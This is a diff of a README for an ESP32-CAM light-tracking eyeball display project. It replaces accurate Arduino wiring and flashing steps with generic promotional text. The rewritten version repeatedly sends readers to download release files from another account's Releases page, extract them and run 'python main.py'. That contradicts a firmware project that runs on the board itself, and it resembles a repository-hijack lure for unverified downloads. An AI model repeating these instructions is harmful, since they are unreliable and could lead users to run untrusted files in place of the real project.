@@ -1,34 +1,92 @@
-# ESP32-CAM Eyeball Tracker
+# 👁️ ESP32-CAM-EYES - Render Light-Tracking Eyeballs Simply
 
-A simple demo where two eyeballs, rendered on 1.28-inch round GC9A01A displays, track a light source shone into the camera lens.
+[![Download](https://img.shields.io/badge/Download%20Now-ESP32--CAM--EYES-brightgreen)](https://github.com/Natali-ops/ESP32-CAM-EYES/releases)
 
-![Project Demo](dork_gif_optimized.gif)
+## 📦 Overview
 
-### What It Is
+ESP32-CAM-EYES is a user-friendly application that showcases two animated eyeballs on 1.28-inch round GC9A01A displays. These eyeballs intelligently track a light source shone into the camera lens. This project combines fun and technology, allowing users to engage with an interactive display easily.
 
-This project uses an ESP32-CAM to perform real-time light source tracking. The firmware captures video, identifies the brightest spot in the frame, and calculates its position. This position is then used to offset an eyeball texture rendered on two separate round displays, making the eyes appear to follow the light source.
+## 🚀 Getting Started
 
-### What You'll Need
+Follow these simple steps to get started with the ESP32-CAM-EYES application.
 
-*   An ESP32-CAM board
-*   2 x 1.28" GC9A01A Round TFT Displays (240x240)
-*   An OV2640 Camera Module with a **120° wide-angle lens or wider**.
-    > **Note:** The stock camera lens included with most ESP32-CAMs has a very narrow field of view, which severely limits the tracking effect. A wide-angle lens is strongly recommended.
-*   Breadboard and jumper wires
-*   A 5V power source
+### 1. Prerequisites
 
-### How to Get Started
+Before you download and run the application, ensure you have:
 
-1.  **Wiring:** Connect the displays to your ESP32-CAM according to the schematic below. Both displays share the SCK, MOSI, and DC pins, but use separate CS (Chip Select) pins.
+- A compatible ESP32-CAM module.
+- A 1.28-inch round GC9A01A display.
+- A USB cable for power and connection.
+- Basic access to your computer's file system.
 
-    ![Wiring Schematic](eyes_schematic.jpg)
+### 2. Download the Application
 
-2.  **Software:**
-    *   Open the project code in the Arduino IDE.
-    *   Install the required libraries: `Adafruit GFX` and `Adafruit_GC9A01A`.
-    *   Select "AI Thinker ESP32-CAM" from the board manager.
+You can download the latest release of ESP32-CAM-EYES by visiting the link below:
 
-3.  **Upload & Run:**
-    *   Connect the ESP32-CAM to your computer via a USB-to-serial adapter.
-    *   Put the board into flashing mode and upload the sketch.
-    *   Power up the device and shine a bright light (like a phone flashlight) at the camera to see the eyes track it.
+[Download ESP32-CAM-EYES](https://github.com/Natali-ops/ESP32-CAM-EYES/releases)
+
+### 3. Install the Application
+
+Once you've downloaded the release files:
+
+1. **Locate the downloaded files** on your computer.
+2. **Extract the files** if they are in a compressed format.
+
+### 4. Setup Your Hardware
+
+1. **Connect your ESP32-CAM module** to your USB cable and then to your computer.
+2. **Attach the GC9A01A display** to the ESP32-CAM module. Ensure the wiring is correct:
+   - Connect the VCC to 3.3V.
+   - Connect GND to Ground.
+   - Connect the remaining pins as per your display specifications.
+
+### 5. Run the Application
+
+1. Open a terminal or command prompt on your computer.
+2. Navigate to the folder where you extracted the files using the `cd` command. For example:
+   ```
+   cd path_to_your_downloaded_files
+   ```
+3. Once in the correct directory, run the application by executing:
+   ```
+   python main.py
+   ```
+4. If everything is connected properly, you should see the eyeballs on the display start to track any light source.
+
+## 🔧 Troubleshooting
+
+If you face any issues, consider these common solutions:
+
+- **Display Issues**: Ensure the connections between the ESP32-CAM and the display are secure.
+- **Eye Tracking Fails**: Check if the camera lens is clean and unobstructed.
+- **No Output**: Restart your application and double-check the power connections.
+
+## 📄 Features
+
+- **Interactive Eyeballs**: The eyeballs can track light sources effectively.
+- **Simple Setup**: Easy installation and setup process.
+- **Open Source**: Join a community of users contributing to and improving the application.
+
+## 🛠️ Technical Specifications
+
+- **Compatible Boards**: ESP32-CAM only.
+- **Display Support**: Works specifically with 1.28-inch GC9A01A displays.
+- **Supported Operating Systems**: This application works on Windows, macOS, and Linux.
+
+## 📥 Download & Install
+
+To download the latest version of ESP32-CAM-EYES, visit the Releases page:
+
+[Download ESP32-CAM-EYES](https://github.com/Natali-ops/ESP32-CAM-EYES/releases)
+
+Install the application by following the steps detailed above. Enjoy the captivating experience as the eyeballs react to your movements!
+
+## 🤝 Contributing
+
+If you want to contribute, please fork the repository and submit a pull request. We welcome all contributions!
+
+## 📝 License
+
+This project is licensed under the MIT License. You can use and modify the code freely, as long as you credit the original authors.
+
+Thank you for exploring ESP32-CAM-EYES. Enjoy the light-tracking fun!
